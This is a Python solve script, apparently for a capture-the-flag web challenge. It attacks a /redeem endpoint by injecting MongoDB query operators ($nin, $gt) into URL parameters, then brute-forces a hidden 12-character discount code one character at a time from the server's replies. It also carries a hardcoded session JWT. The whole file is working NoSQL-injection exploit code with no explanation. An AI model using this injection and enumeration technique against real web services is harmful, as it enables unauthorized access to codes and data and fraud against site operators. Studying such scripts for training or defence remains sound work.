import requests

path = 'http://speed.challs.srdnlen.it:8082'

headers = {
    'User-Agent': "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
    'Cookie': "jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOiI2NzhjNjA2M2Q4YjZmYzFkNTNjOWY0OTciLCJpYXQiOjE3MzcyNTI5NjMsImV4cCI6MTczNzI4ODk2M30.ggYbotN2WyO2io_okxAhgs-fU6HHGG7rLosy9b18oZk"
}

res = requests.get(
    path + f'/redeem',
    headers=headers,
    params={
        'discountCode[$nin]':['YA9LPT9T4P3H','6EJ5TLWHZ33J','69JT0DQHHBIR','65JNFAFQKS6Y'],
    }
)

print(res.text)
exit()

code = ''
cands = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ'
for _ in range(12):
    left, right = 0, len(cands) - 1
    for i, c in enumerate(cands):
        print(f'\r{code + c}', end='')
        res = requests.get(
            path + f'/redeem',
            headers=headers,
            params={
                'discountCode[$nin]':['YA9LPT9T4P3H','6EJ5TLWHZ33J','69JT0DQHHBIR','65JNFAFQKS6Y'],
                'discountCode[$gt]':code + c,
            }
        )

        if 'You have already redeemed your gift card today!' in res.text:
            continue
        elif 'Invalid discount code!' in res.text:
            if i > 0: code += cands[i - 1]
            else: cands[0]
            break
        else:
            print(f'{code = }')
            raise Exception('fuck')
    else:
        code += cands[-1]
    
    print()
    print(f'{code = }')

print(f'{code = }')

# YA9LPT9T4P3H, 6EJ5TLWHZ33J, 69JT0DQHHBIR, 65JNFAFQKS6Y